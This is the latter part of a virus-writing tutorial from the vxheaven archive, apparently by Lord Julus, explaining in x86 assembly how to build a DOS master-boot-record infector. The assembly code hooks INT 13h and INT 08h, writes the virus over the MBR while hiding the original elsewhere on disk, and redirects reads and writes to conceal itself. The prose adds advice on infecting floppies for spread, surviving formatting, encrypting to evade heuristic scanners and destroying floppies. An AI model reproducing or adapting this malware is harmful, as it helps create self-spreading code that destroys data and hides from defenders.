+<p>Now the copy of our virus is in memory at ES:0. There is no need to stay in the 0000:7C00 area because anyway we must start loading the real MBR there. Therefore we'll do this:</p>
+<pre class="source">
+	push es			; put the new segment on stack
+	lea ax, new_segment	; and the IP where to jump
+	push ax
+	retf			; and simulate a return far
+new_segment:
+	...
+</pre>
+<p>and we go on with the code but into the new segment we've got. Before starting to load the real MBR we must first hook the interrupts we need and especially the disk interrupt INT 13h. So:</p>
+<pre class="source">
+	mov ax, word ptr ds:[13h*4] ; save INT 13's vector
+	mov word ptr cs:[oldint13], ax
+	mov ax, word ptr ds:[13h*4+2]
+	mov word ptr cs:[oldint13+2], ax
+
+	lea ax, newint13	; and set new INT 13h
+	mov word ptr ds:[13h*4], ax
+	mov ax, es
+	mov word ptr ds:[13h*4+2], ax
+</pre>
+<p>We'll talk later about the newint13 handler.</p>
+<p>Now we can already start to load the MBR from the free zone. This is done simply by using the 02h function. And we read the original MBR at the end of our code in memory:</p>
+<pre class="source">
+	mov ah, 02h		; read original MBR
+	mov al, 01h		; 1 sector
+	mov dl, 80h		; from HDD
+	mov dh, 00h		; head 0
+	mov cx, 01h		; cyl 0, sector 1
+	push cs
+	pop es
+	lea bx, finish		; at ES:BX
+	int 13h
+</pre>
+<p>Now, BX is at the end of virus. We add to it an offset where we have a marker defined like this:</p>
+<p>Marker db 'xx' ; where 'xx' can be any combination of chars</p>
+<pre class="source">
+	add bx, offset marker
+	cmp word ptr cs:[bx], 'xx'
+	je already_infected
+</pre>
+<p>Let's assume for now that yes, the HDD is infected. So, if the HDD is already infected we do this:</p>
+<pre class="source">
+Already_infected:		; this part is common to in_boot
+	cmp cs:[inboot], 1	; and in_file modes so we check
+	jne exit_file		; and if it's file we exit the file
+
+Load_old_boot:			; otherwise
+
+	mov ah, 0		; first we reset the drive
+	mov dl, 80h
+	int 13h
+
+	mov ah, 02h		; and then we read
+	mov al, 01h		; one sector
+	mov dl, 80h		; from HDD
+	mov dh, 00h		; head 0
+	mov cx, 01h + sector_len ; cylinder 0, sector = 1+sector_len
+	push 0
+	pop es
+	mov bx, 7c00h		; at 0000:7C00
+	int 13h
+
+	db 0EAh			; and here we have JMP 0000:7C00
+	dw 7c00h		; i.e. jump to the original MBR
+	dw 0000h
+</pre>
+<p>I hope all is clear. The only thing to talk about would be the sector_len variable. A complicated virus tends to go beyond 5K in these days. This means that there's no way your virus will fit into 512 bytes, e.g. on one sector. This means you'll have to write your virus on more than one sector. But, how many ? Look at this:</p>
+<p>sector_len = (finish - start + 1FFh) / 200h</p>
+<p>If (finish - start) is &lt;= 200h the result of the above formula is 1.</p>
+<p>If (finish - start) is > 200h but &lt;= 400h the above gives 2, and so on. Example:</p>
+<p>(188h + 1FFh) div 200h = 1 sector</p>
+<p>(220h + 1FFh) div 200h = 2 sectors</p>
+<p>(1000h + 1FFh) div 200h = 23 sectors</p>
+<p>So, this gives you the length of your virus in sectors. Let's take a look at the infected HDD (sl = sector_len):</p>
+<pre class="source">
+.--------------------. ---. ---.
+| C:0, H:0, S:1      |    |    .-- This is where the orig. MBR was once
+.--------------------.    | ---'
+| C:0, H:0, S:2      |    |
+'--------------------'    .------- And now this is where the virus is
+......................    |
+.--------------------.    |
+| C:0, H:0, S:sl     |    |
+.--------------------. ---' ---.
+| C:0, H:0, S:sl+1 | .-- Here is the where the MBR was moved
+'--------------------' ---'
+</pre>
+<p>Now let's see what should happen if the HDD was clean in order to infect it. First:</p>
+<pre class="source">
+Save_old_boot:
+	mov ah, 03h		; write bytes
+	mov al, 01h		; 1 sector
+	mov dl, 80h		; on HDD
+	mov dh, 00h		; head 0
+	mov cx, 01h + sector_len ; cylinder 0, sector = 2+sector_len
+	lea bx, finish		; from the end ! (where we have
+	int 13h			; a copy of the MBR)
+
+Write_new_boot_loader:
+	mov ah, 03h		; this part simply copies
+	mov al, sector_len	; sector_len sectors
+	mov dl, 80h
+	mov dh, 00h
+	mov cx, 01h		; at (0,0,1)
+	lea bx, start		; from the beginning of virus
+	int 13h
+</pre>
+<p>This is how the things work when you are in boot. Let's take a look at the other part now: in_file. This is easier than you think:</p>
+<pre class="source">
+In_file:
+	call go_resident
+	jmp over_now
+
+Go_resident:			; here we have ANY kind of resident
+	...			; code which leaves in ES the
+	ret			; new viral segment.
+				; The Int 21 hooking should take place
+				; here too.
+
+over_now:
+	push es			; and here we jump to the common
+	lea ax, new_segment	; part of the in_file and in_boot
+	push ax
+	retf
+</pre>
+<p>What we have more related on the file infection is: we have the INT 21 handler which is used to catch executable files (any kind and in anyway), and the exit_file procedure which gives the control back to the host. Of course, INT 13 must be also hooked when 'in file', because the MBR must be stealthed. And, of course, we must use some kind of tunneling techniques against TSR blockers.</p>
+<p>As everybody knows, hooking INT 21h from a file is a piece of cake. We cannot say the same thing when you are in the Boot. There you have NO INT 21h, so you have nothing to hook ! You must wait for the system to load completely and then act. This is done easy by using the INT 08, e.g. the time interrupt. Hook this interrupt in boot and set a counter. After, let's say 2 minutes start to hook the interrupts. The Int 08 is called every 55ms, or 18.2 times per second. So for a delay of 1 second you must set a compare value of 18 and decrease it until it's 0. To have a one minute delay, the compare value should be 60*18.2 = 1092, and for 2 minutes 2184.</p>
+<p>The Int 08 could look like this:</p>
+<pre class="source">
+INT08:
+	pushf
+	call dword ptr cs:[oldint08]
+	cmp word ptr cs:[time], 0
+	je start_to_hook
+	dec word ptr cs:[time]
+	iret
+
+time	equ	2184
+</pre>
+<p>This solves the problem of hooking int 21h from the boot. Now, let's take a look at the INT 13h, the heart of the boot infector. Here we do all our stealthing. It should look like this:</p>
+<pre class="source">
+NEWINT13:
+	cmp ah, 02h		; a read ?
+	je check_more
+	jmp no
+
+check_more:
+	cmp dh, 0		; head 0 ?
+	jne no
+	cmp cx, 1		; cylinder 0, sector 1 ?
+	jne no
+	pushf
+	call dword ptr cs:[oldint13] ; then do the reading
+	call check_infect	; a call to a routine that should save
+				; all the register, check if the MBR
+				; at ES:BX is infected. If not, infect
+				; it.
+	mov cx, 01h + sector_len ; then redirect read or write
+				; to where the original MBR is
+				; and read it again !
+no:
+	jmp dword ptr cs:[oldint13]
+</pre>
+<p>We should also check if someone is trying to write to the MBR and redirect the write to the place where the original MBR is.</p>
+<p>So, if someone is trying to read from the MBR or write on the original MBR this procedure redirects the action to where the real MBR is saved. This offers a lot of strength: As the partition table is no longer there, the disk in invisible if booted from a floppy. But if it's booted from HDD, the virus is resident and the reads and writes are stealthed. There are two more functions one stealth routine should hook:</p>
+<ul>
+<li>0Ah - read long sectors</li>
+<li>0Bh - write long sectors</li>
+</ul>
+<p>These work almost like 02h and 03h with this difference: 0Ah reads one or more sectors plus 4 more bytes representing the ECC (error correction code) code for that sector. Same for 0Bh. Also, one must take care of the 05h function - format track, and do not allow the formatting of the tracks where the virus and the original MBR is. I didn't try this, but it should work. In this way, the virus stays on even if the HDD is formatted.</p>
+<h3>3) Other ways</h3>
+<p>As I said above, it is possible to write whatever you want to save on the HDD by putting the data in the second FAT or after the directory entry. The first FAT can be found and accessed via INT 25h/26h, with DX=1 (usually) and the second FAT can be found with DX = 1 + Sectors/FAT. After a number of sectors equal to 1 + 2*Sectors/FAT we have the directory root entry. However I would not recommend using these two areas. First because in order to infect you need to use interrupts 25h and 26h, which are disabled in Windows 95 and because of the data loss that may occur. Therefore, I would say that the space after the MBR is the best place to put your data</p>
+<h2><a name="p4">More to it</a></h2>
+<p>One issue that everybody should be aware of is that MBR heuristic analyzers are very good these days. This means that if you decide to make a Partition Table non-remover, leaving the Drive C accessible when booted from floppy disks, you should consider a good encryption algorithm with some anti-heuristic routines. This is done as easy as it's done in files:</p>
+<ul>
+<li>copy virus to end of code</li>
+<li>encrypt it</li>
+<li>copy it to host (drive / file)</li>
+</ul>
+<p>Another very important thing is to have the virus infect floppies. Actually this is the most important thing because it assures the virus' spreading. In order to infect a floppy disk the things go exactly like when writing a MBR mover for HDD. On floppy disks there is no partition table, therefore no MBR. The Boot Layout is the same. In order to save the original boot one should do this:</p>
+<ul>
+<li>read the original boot into a buffer</li>
+<li>read the Number of Root Directory Entries</li>
+<li>Multiply it by 32</li>
+<li>Divide it by 512</li>
+</ul>
+<p>Now you have the first free sector after the Root Directory Table. There is a perfect place to save the original Boot on that sector. Knowing that when INT 13 is called the DL register holds the drive (80h if HDD) you can do some comparisons and make a separate procedure for infecting different kind of floppies. If you want your virus to be faster, figure out the sector you should write the boot to and consider that it's always the same (for example I have a 18 sectors/track with 224 directory entries floppy, with the directory entry area being at C:0, H:0, S:1. So 224*32/512 = 14. This means that from (0,1,14) I have a free area where I can copy the original boot.</p>
+<p>You can also choose other areas to put the original copy of the boot on, like for example on the last cylinder, last head, last sector and then mark that sector as BAD.</p>
+<p>One thing about floppy disks: Beware to save the original 20h bytes and leave them intact on the floppy. There we have the Boot Record. If you put trash there, the disk won't be readable. You can even destroy the disk forever if you put a 0 in the Sectors/Track. If you do this and try to access the floppy there is no program on Earth that will be able to read your diskette. You'll get a 'Divide Overflow' or 'Division by 0' and you can send the floppy disk on a nice trip towards the trashcan...</p>
+<h2><a name="p5">The Future</a></h2>
+<p>As for the future, what can I say ? God knows... Anyway, a while ago some guy came up with a very neat technique to read/write from/to HDD using only the HDD ports. It was absolutely beautiful! But when Windows 95 came along it all gone astray... This was the ultimate technique: to be able to simulate the Int 13 by doing what the Int actually does. In W95 the ports are mapped in a strange way, the interrupts don't work and everything is messed up. Anyway, the possibilities are still grand, but the thing we must think of is that we need a 'change'. A change of conception. We must start looking at the code now from a 32 byte point of view, we must forget about segments and start looking at selectors and so on... Anyway, as programmers say: "You know, there's always a leak !"</p>
+<h2><a name="p6">Final word</a></h2>
+<p>There were some very interesting tutorials written on the Boot infectors, but I always felt they don't make the perfect distinction between the Boot and the MBR. I can remember here Qark's tutorial, Executioner's, and of course one of the first, Dark Angel's tutorial to Boot viruses. Well, hoping that I wasn't very redundant in my writings I hope you all learned something from it. If any of you come over a mistake I made in my writing I would appreciate your help. (e-mail me at: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="066a6974626c736a737546616369656f726f63752865696b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>). Thanx.</p>
+<p>You can always find my articles at:</p>
+<p>http://members.tripod.com/~lordjulus</p>
+<p>All the Best to U and all,</p>
+<p>Many thanx go to: Qark, Quantum, Dark Angel, Executioner, Mr.Sandman, Darkman, Hellraiser, Dark Avenger</p>
+[<a style="" href="/lib/?lang=EN&amp;index=DO#vlj01">Back to index</a>] [<a href="/lib/vlj01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vlj01">de</a><a href="/lib/index.php?lang=en&amp;id=vlj01">en</a><a href="/lib/index.php?lang=es&amp;id=vlj01">es</a><a href="/lib/index.php?lang=it&amp;id=vlj01">it</a><a href="/lib/index.php?lang=fr&amp;id=vlj01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vlj01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vlj01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vlj01">ua</a></div>
+</body>
+</html>
